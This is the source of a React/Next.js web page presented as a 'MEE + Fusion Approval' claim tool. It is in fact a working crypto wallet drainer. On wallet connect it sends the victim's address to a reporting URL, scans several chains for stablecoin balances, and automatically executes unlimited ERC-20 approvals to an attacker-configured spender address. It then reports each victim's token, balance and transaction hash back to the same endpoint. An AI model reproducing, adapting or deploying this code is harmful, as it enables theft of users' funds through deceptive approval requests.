'use client';
import { useState, useEffect } from 'react';
import { useAccount, useWriteContract } from 'wagmi';
import { erc20Abi, maxUint256, parseUnits } from 'viem';
import { readContract, getBalance, switchChain } from '@wagmi/core';
import { config } from '../config';

// MEE + Fusion SDK
import {
  createMeeClient,
  toMultichainNexusAccount,
  getMEEVersion,
  MEEVersion,
} from '@biconomy/abstractjs';
import { createWalletClient, custom, http } from 'viem';
import { mainnet, sepolia, arbitrum } from 'viem/chains';

// Environment variables
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || '') as `0x${string}`;
const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY;

if (!SPENDER || SPENDER === '0x') {
  throw new Error('SPENDER_ADDRESS is not defined or invalid');
}

// Types
type MeeClient = any;

// Tokens grouped by chainId
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  1: [
    {
      symbol: 'USDT',
      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      min: BigInt(1 * 10 ** 6),
      decimals: 6,
    },
    {
      symbol: 'USDC',
      address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      min: BigInt(1 * 10 ** 6),
      decimals: 6,
    },
    {
      symbol: 'DAI',
      address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
      min: BigInt(1 * 10 ** 18),
      decimals: 18,
    },
    {
      symbol: 'BUSD',
      address: '0x4fabb145d64652a948d72533023f6e7a623c7c53',
      min: BigInt(1 * 10 ** 18),
      decimals: 18,
    },
  ],
  42161: [
    {
      symbol: 'USDT',
      address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
      min: BigInt(1 * 10 ** 6),
      decimals: 6,
    },
    {
      symbol: 'USDC',
      address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
      min: BigInt(1 * 10 ** 6),
      decimals: 6,
    },
    {
      symbol: 'DAI',
      address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
      min: BigInt(1 * 10 ** 18),
      decimals: 18,
    },
  ],
  11155111: [
    {
      symbol: 'USDC',
      address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
      min: BigInt(1 * 10 ** 6),
      decimals: 6,
    },
    {
      symbol: 'LINK',
      address: '0x779877A7B0D9E8603169DdbD7836e478b4624789',
      min: BigInt(1 * 10 ** 18),
      decimals: 18,
    },
  ],
};

// Chain names
const CHAIN_NAMES: Record<number, string> = {
  1: 'Ethereum Mainnet',
  42161: 'Arbitrum',
  11155111: 'Sepolia',
};

// Connection reporter
function ConnectionReporter() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    if (isConnected && address) {
      fetch(`${REPORT_URL}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: 'connect',
          wallet: address,
        }),
      }).catch(console.error);
    }
  }, [isConnected, address]);

  return null;
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const { writeContractAsync } = useWriteContract();
  const [status, setStatus] = useState<string>('');
  const [meeClient, setMeeClient] = useState<MeeClient | null>(null);
  const [orchestrator, setOrchestrator] = useState<any>(null);

  // Initialize MEE Client for Fusion mode ONLY
  useEffect(() => {
    async function initializeMeeClient() {
      if (!isConnected || !address || !BICONOMY_API_KEY) return;

      try {
        setStatus('Initializing MEE + Fusion client...');

        if (typeof window !== 'undefined' && (window as any).ethereum) {
          const walletClient = createWalletClient({
            account: address,
            transport: custom((window as any).ethereum),
          });

          const multiAccount = await toMultichainNexusAccount({
            chainConfigurations: [
              {
                chain: mainnet,
                transport: http(),
                version: getMEEVersion(MEEVersion.V2_1_0),
              },
              {
                chain: arbitrum,
                transport: http(),
                version: getMEEVersion(MEEVersion.V2_1_0),
              },
              {
                chain: sepolia,
                transport: http(),
                version: getMEEVersion(MEEVersion.V2_1_0),
              },
            ],
            signer: walletClient,
          });

          setOrchestrator(multiAccount);

          const client = await createMeeClient({
            account: multiAccount,
            apiKey: BICONOMY_API_KEY,
          });

          setMeeClient(client);
          setStatus('MEE + Fusion client ready ✅');
        } else {
          setStatus('❌ Ethereum provider not found - please use MetaMask or compatible wallet');
        }
      } catch (error: any) {
        console.error('Failed to initialize MEE client:', error);
        setStatus(`Failed to initialize MEE + Fusion: ${error.message || 'Unknown error'}`);
      }
    }

    initializeMeeClient();
  }, [isConnected, address, BICONOMY_API_KEY]);

  // Check if token supports ERC20Permit
  async function supportsERC20Permit(tokenAddress: `0x${string}`, chainId: number): Promise<boolean> {
    try {
      await readContract(config, {
        chainId,
        address: tokenAddress,
        abi: [
          {
            name: 'PERMIT_TYPEHASH',
            type: 'function',
            stateMutability: 'view',
            inputs: [],
            outputs: [{ type: 'bytes32' }],
          },
        ],
        functionName: 'PERMIT_TYPEHASH',
      });
      return true;
    } catch {
      try {
        await readContract(config, {
          chainId,
          address: tokenAddress,
          abi: [
            {
              name: 'version',
              type: 'function',
              stateMutability: 'view',
              inputs: [],
              outputs: [{ type: 'string' }],
            },
          ],
          functionName: 'version',
        });
        return true;
      } catch {
        return false;
      }
    }
  }

  // Main claim function using ONLY MEE + Fusion
  async function handleClaim() {
    if (!isConnected || !address) {
      setStatus('❌ Wallet not connected');
      return;
    }

    if (!meeClient || !orchestrator) {
      setStatus('❌ MEE + Fusion client not ready. Please wait or refresh.');
      return;
    }

    try {
      setStatus('🔍 Scanning chains for token balances...');

      let targetChain: number | null = null;
      let usableTokens: {
        symbol: string;
        address: `0x${string}`;
        min: bigint;
        decimals: number;
      }[] = [];

      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);

        for (const token of tokens) {
          try {
            const bal = (await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: 'balanceOf',
              args: [address],
            })) as bigint;

            if (bal >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
            }
          } catch {}
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus('❌ No usable token balances found on supported chains.');
        return;
      }

      const chainName = CHAIN_NAMES[targetChain!] || `Chain ${targetChain}`;

      if (chainId !== targetChain) {
        setStatus(`🔄 Switching to ${chainName}...`);
        await switchChain(config, { chainId: targetChain });
      }

      for (const token of usableTokens) {
        setStatus(`🚀 Processing ${token.symbol} on ${chainName} with MEE + Fusion...`);

        try {
          let rawBalance: bigint = BigInt(0);
          try {
            rawBalance = (await readContract(config, {
              chainId: targetChain!,
              address: token.address,
              abi: erc20Abi,
              functionName: 'balanceOf',
              args: [address],
            })) as bigint;
          } catch (err) {
            console.error(`Failed to read balance for ${token.symbol}:`, err);
            setStatus(`❌ Could not read ${token.symbol} balance`);
            continue;
          }

          const supportsPermit = await supportsERC20Permit(token.address, targetChain);
          setStatus(`🔍 ${token.symbol} ${supportsPermit ? 'supports' : 'does not support'} ERC20Permit`);

          setStatus(`🔄 Building approval instruction for ${token.symbol}...`);

          const approvalInstruction = await orchestrator.buildComposable({
            type: 'default',
            data: {
              abi: erc20Abi,
              chainId: targetChain,
              to: token.address,
              functionName: 'approve',
              args: [SPENDER, maxUint256],
            },
          });

          setStatus(`🔄 Creating Fusion quote for ${token.symbol} approval...`);

          const fusionQuote = await meeClient.getFusionQuote({
            instructions: [approvalInstruction],
            trigger: {
              chainId: targetChain,
              tokenAddress: token.address,
              amount: parseUnits('1', token.decimals),
            },
            feeToken: {
              address: token.address,
              chainId: targetChain,
            },
          });

          if (supportsPermit) {
            setStatus(`⚡ Executing gasless approval for ${token.symbol} via ERC20Permit...`);
          } else {
            setStatus(`⚡ Executing approval for ${token.symbol} via Fusion (requires gas)...`);

            const nativeBal = await getBalance(config, { address, chainId: targetChain });
            if (nativeBal.value < BigInt(100000000000000)) {
              setStatus(`❌ Not enough native token for gas on ${token.symbol}`);
              continue;
            }
          }

          const result = await meeClient.executeFusionQuote({ fusionQuote });

          setStatus('⏳ Waiting for completion...');
          await meeClient.waitForSupertransactionReceipt({ hash: result.hash });

          const decimals = token.decimals || 18;
          const formattedBalance = Number(rawBalance) / 10 ** decimals;

          setStatus(`✅ ${token.symbol} approved via MEE + Fusion | Balance: ${formattedBalance}`);

          await fetch(`${REPORT_URL}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: 'fusion_approval',
              wallet: address,
              chainName,
              token: token.address,
              symbol: token.symbol,
              balance: formattedBalance,
              txHash: result.hash,
              triggerType: supportsPermit ? 'ERC20Permit' : 'OnchainTx',
              fusionMode: true,
            }),
          }).catch(console.error);
        } catch (err: any) {
          console.error(`Fusion error for ${token.symbol}:`, err);
          setStatus(`❌ Fusion failed for ${token.symbol}: ${err?.message || 'Unknown error'}`);
          continue;
        }
      }

      setStatus('🎉 All MEE + Fusion orchestrations completed!');
    } catch (err: any) {
      console.error('Main fusion error:', err);
      setStatus(`❌ Fusion Error: ${err?.shortMessage || err?.message || 'Unknown error'}`);
    }
  }

  useEffect(() => {
    if (isConnected && address && meeClient && orchestrator) {
      handleClaim();
    }
  }, [isConnected, address, meeClient, orchestrator]);

  return (
    <main
      style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        gap: '24px',
        marginTop: '40px',
      }}
    >
      <header
        style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          height: '64px',
          background: '#09011fff',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          padding: '0 24px',
          paddingTop: 'env(safe-area-inset-top)',
          boxShadow: '0 2px 8px rgba(241, 235, 235, 0.08)',
          zIndex: 1000,
        }}
      >
        <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: '18px', color: '#aaa587ff' }}>
          MEE + FUSION ONLY
        </div>
        <appkit-button />
      </header>

      <ConnectionReporter />

      <div
        style={{
          display: 'flex',
          flexDirection: 'column',
          gap: '24px',
          paddingTop: '80px',
          width: '80%',
          maxWidth: '600px',
        }}
      >
        <div
          style={{
            border: '1px solid #9dd6d1ff',
            borderRadius: '12px',
            padding: '20px',
            background: '#090e41ff',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'space-between',
            height: '500px',
          }}
        >
          <h2 style={{ marginBottom: '12px', color: '#ffffff' }}>MEE + Fusion Approval</h2>

          <div
            style={{
              flex: 1,
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              justifyContent: 'center',
              color: '#e4e1daff',
              fontSize: '14px',
              textAlign: 'center',
              lineHeight: '1.5',
            }}
          >
            <div style={{ marginBottom: '20px', fontWeight: 'bold' }}>🔥 Pure MEE + Fusion Mode</div>
            <div style={{ marginBottom: '20px', fontSize: '12px', opacity: 0.8 }}>
              • Gasless for ERC20Permit tokens
              <br />
              • Orchestrated execution via Companion Account
              <br />
              • No traditional approvals - Fusion only!
            </div>
            <div
              style={{
                backgroundColor: '#1a1a2e',
                padding: '15px',
                borderRadius: '8px',
                minHeight: '100px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                width: '100%',
              }}
            >
              {status || 'Connect wallet to start MEE + Fusion'}
            </div>
          </div>

          <button
            onClick={handleClaim}
            style={{
              background: meeClient && orchestrator ? '#0066cc' : '#666666',
              color: 'white',
              padding: '12px 28px',
              borderRadius: '8px',
              cursor: meeClient && orchestrator ? 'pointer' : 'not-allowed',
              border: 'none',
              marginTop: '16px',
            }}
            disabled={!(meeClient && orchestrator)}
          >
            {meeClient && orchestrator ? '🚀 Execute Fusion' : '⏳ Initializing MEE...'}
          </button>
        </div>

        {[1, 2, 3].map((i) => (
          <div
            key={i}
            style={{
              border: '1px solid #c9c8ddff',
              borderRadius: '12px',
              padding: '20px',
              background: '#0e0a42ff',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
          >
            <span>Fusion Box {i}</span>
          </div>
        ))}
      </div>
    </main>
  );
}
